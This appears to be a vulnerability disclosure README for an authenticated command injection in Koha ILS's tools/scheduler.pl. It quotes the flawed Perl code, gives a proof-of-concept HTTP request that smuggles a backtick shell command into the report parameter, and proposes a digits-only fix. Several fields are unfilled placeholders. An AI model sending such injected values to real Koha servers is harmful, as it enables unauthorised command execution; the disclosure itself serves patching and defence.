# Koha ILS Command Injection Vulnerability

This repository documents a command injection vulnerability in Koha Integrated Library System affecting versions prior to 24.05.07, 24.11.02, 23.11.12, and 22.11.24.

## Vulnerability Details

- **CVE ID**: CVE-YYYY-XXXXX (pending assignment)
- **Vulnerability Type**: Command Injection
- **CWE**: CWE-78 (Improper Neutralisation of Special Elements used in an OS Command)
- **Affected Component**: tools/scheduler.pl
- **Affected Versions**: 
  - < 24.05.07
  - < 24.11.02 
  - < 23.11.12
  - < 22.11.24

## Description

Koha Integrated Library System contains an authenticated command injection vulnerability in the task scheduler functionality. The vulnerability exists in `tools/scheduler.pl` where user input from the `$report` parameter is directly interpolated into a shell command without proper sanitisation. An authenticated administrator with access to the scheduler functionality can execute arbitrary commands on the server.

## Technical Details

The vulnerability is present in lines 92-94 of `tools/scheduler.pl`:

```perl
my $command =
      "export KOHA_CONF=\"$CONFIG_NAME\"; "
    . "$base/cronjobs/runreport.pl $report --format=$format --to='$email'";
```

The `$report` variable comes from user input and undergoes insufficient validation. While the code checks that a report ID exists in the database, it doesn't sanitise the value against command injection attacks. An attacker can bypass this validation by providing a valid report ID followed by shell metacharacters.

## Proof of Concept

The following HTTP request can be used to exploit the vulnerability:

```http
POST /cgi-bin/koha/tools/scheduler.pl HTTP/1.1
Host: [koha-instance]
Content-Type: application/x-www-form-urlencoded
Cookie: [authentication-cookies]

csrf_token=[token]&op=cud-add&starttime=16:33&startdate=&report=19012025```echo "RCE test" > /tmp/rce.txt```&format=text&email=test@example.com
```

This creates a file `/tmp/rce.txt` containing "RCE test" on the target server.

## Impact

This vulnerability allows an authenticated administrative user to:
- Execute arbitrary commands with the permissions of the web server user
- Access, modify, or delete library data
- Potentially gain further access to the host system

## Recommended Fixes

Implement proper input validation and command sanitisation:

```perl
# Validate that $report contains only digits
if ($report && $report =~ /^\d+$/) {
    my $command =
          "export KOHA_CONF=\"$CONFIG_NAME\"; "
        . "$base/cronjobs/runreport.pl $report --format=$format --to='$email'";
    # Rest of code...
}
else {
    # Handle invalid input
    $template->param( job_add_failed => 1 );
}
```

## Responsible Disclosure

This vulnerability was reported to the Koha project maintainers on [DATE], and has been fixed in the following releases:
- 24.05.07
- 24.11.02
- 23.11.12
- 22.11.24

## Timeline

- **Discovery**: [Your discovery date]
- **Reported**: [Your report date]
- **Fixed**: [Fix date]
- **Public disclosure**: [Disclosure date]

## Credit

Discovered by [Your Name/Organisation]

## References

1. [Link to Koha security advisory when available]
2. [Link to patch/commit when available]
